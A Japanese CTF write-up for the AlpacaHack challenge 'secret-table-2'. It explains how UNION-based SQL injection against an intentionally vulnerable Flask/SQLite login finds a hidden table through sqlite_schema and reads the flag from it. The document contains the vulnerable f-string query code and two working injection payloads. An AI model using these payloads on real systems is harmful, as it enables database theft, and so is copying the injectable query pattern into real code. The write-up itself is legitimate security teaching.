# secret-table-2

https://alpacahack.com/daily/challenges/secret-table-2

## 問題の概要

SQL インジェクションが可能な Web アプリケーションで、名前が分からないテーブルに保存されているフラグを取得する問題です。

`/login` ページで次のようにログイン処理が行われています。

```python
@app.post("/login")
def login():
  username = request.form.get("username", "")
  password = request.form.get("password", "")

  conn = sqlite3.connect("database.db")
  query = (
      f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"
  )

  ...
  user = conn.execute(query).fetchone()
  ...

  if user is None:
      return "invalid credentials"

  return f"Hello, {user[0]}!"
```

フラグはサーバー開始時に次のようにデータベースに保存されます。

```python
secret_table_name = "secret_" + hashlib.sha256(FLAG.encode()).hexdigest()[:16]
secret_column_name = "flag_" + hashlib.sha256(FLAG.encode()).hexdigest()[:16]
...
def init_db():
    conn = sqlite3.connect("database.db")
    ...
    conn.execute(
        f"""
        INSERT OR IGNORE INTO {secret_table_name} ({secret_column_name}) VALUES ('{FLAG}');
        """
    )
    ...
```

## 解法

対策が行われていないため SQL インジェクションが可能で、クエリ結果の 1 行目の最初のカラムの値を取得できます。

SQLiteでは `sqlite_schema` テーブルにデータベース内のテーブルやインデックスなどの情報が保存されています。

- [The Schema Table - SQLite Documentation](https://www.sqlite.org/schematab.html)

```sql
CREATE TABLE sqlite_schema(
  type text,
  name text,
  tbl_name text,
  rootpage integer,
  sql text
);
```

クエリは 1 文しか実行できませんが、`UNION` を使用して任意のテーブルのデータをクエリ結果に含めることができます。
`UNION` はカラム数が同じテーブル同士の行を結合する演算子で、例えば

| username | password |
| -------- | -------- |
| alpaca   | pacapaca |

と

| type  | name           |
| ----- | -------------- |
| table | secret\_\*\*\* |

を `UNION` で結合すると

| username | password       |
| -------- | -------------- |
| alpaca   | pacapaca       |
| table    | secret\_\*\*\* |

のようなクエリ結果になります。

## 解答に使用した入力

まず、`sqlite_schema` テーブルから `secret_` で始まるテーブル名を取得します。

<pre>
SELECT * FROM users WHERE username='<ins>a</ins>' AND password='<ins>' UNION SELECT name, 1 FROM sqlite_schema WHERE name LIKE 'secret_%' AND '1</ins>';</pre>

名前が判明した secret テーブルの内容を取得すればフラグが得られます。

<pre>SELECT * FROM users WHERE username='<ins>a</ins>' AND password='<ins>' UNION SELECT *, 1 FROM secret_****** WHERE '1</ins>';</pre>
